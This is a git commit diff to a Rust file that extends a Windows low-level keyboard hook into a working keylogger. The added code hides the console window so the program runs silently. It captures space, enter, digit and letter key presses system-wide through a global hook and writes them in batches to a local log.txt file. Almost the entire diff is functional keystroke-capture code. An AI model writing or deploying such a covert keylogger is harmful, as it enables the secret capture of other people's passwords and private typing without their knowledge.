f6d73c7069565171f19e43a00f7494d977531e35
Eveheeero <xhve00000@naver.com>
2022-12-14 09:04:30 +0000

    +

--- Jobs/hook/src/windows.rs
+++ Jobs/hook/src/windows.rs
@@ -1,3 +1,7 @@
+#![windows_subsystem = "windows"]
+
+use std::{cell::RefCell, io::Write};
+
 use windows::Win32::{
     Foundation::{BOOL, HINSTANCE, HWND, LPARAM, LRESULT, WPARAM},
     UI::{
@@ -9,17 +13,35 @@ use windows::Win32::{
     },
 };
 
+static mut DATA: Option<RefCell<std::fs::File>> = None;
+static mut BUF: String = String::new();
+static mut GO: bool = true;
+
 unsafe extern "system" fn callback(code: i32, wparam: WPARAM, laparam: LPARAM) -> LRESULT {
     if code == HC_ACTION.try_into().unwrap() {
-        for now in std::iter::once(0x20)
-            .chain(std::iter::once(0x0D))
+        for now in (0x20..=0x20)
+            .chain(0x0D..=0x0D)
             .chain(0x30..0x39)
             .chain(0x41..0x5A)
         {
             let space_status = GetAsyncKeyState(now);
-            if space_status.leading_ones() == 0 && space_status.trailing_zeros() == 0 {
+            if space_status.leading_zeros() == 0 {
                 // 0x8000
-                println!("{} is pressed", now);
+                let msg = match now {
+                    0x20 => String::from("Space"),
+                    0x0D => String::from("Enter"),
+                    0x30..=0x39 => format!("{}", now - 0x30),
+                    0x41..=0x5A => format!("{}", (now - 0x41 + 0x61) as u8 as char),
+                    _ => break,
+                };
+                BUF.push_str(msg.as_str());
+                BUF.push('\n');
+                if BUF.len() > 100 {
+                    let mut file = DATA.as_ref().unwrap().borrow_mut();
+                    file.write_all(BUF.as_bytes()).unwrap();
+                    file.flush().unwrap();
+                    BUF.clear();
+                }
                 break;
             }
         }
@@ -33,9 +55,10 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     let handle;
     unsafe {
         handle = SetWindowsHookExW(WH_KEYBOARD_LL, CALLBACK, HINSTANCE::default(), 0)?;
+        DATA = Some(RefCell::new(std::fs::File::create("log.txt")?));
 
         let mut msg = MSG::default();
-        while GetMessageA(&mut msg, HWND(0), 0, 0) == BOOL(1) {
+        while GO && GetMessageA(&mut msg, HWND(0), 0, 0) == BOOL(1) {
             TranslateMessage(&msg);
             DispatchMessageA(&msg);
         }
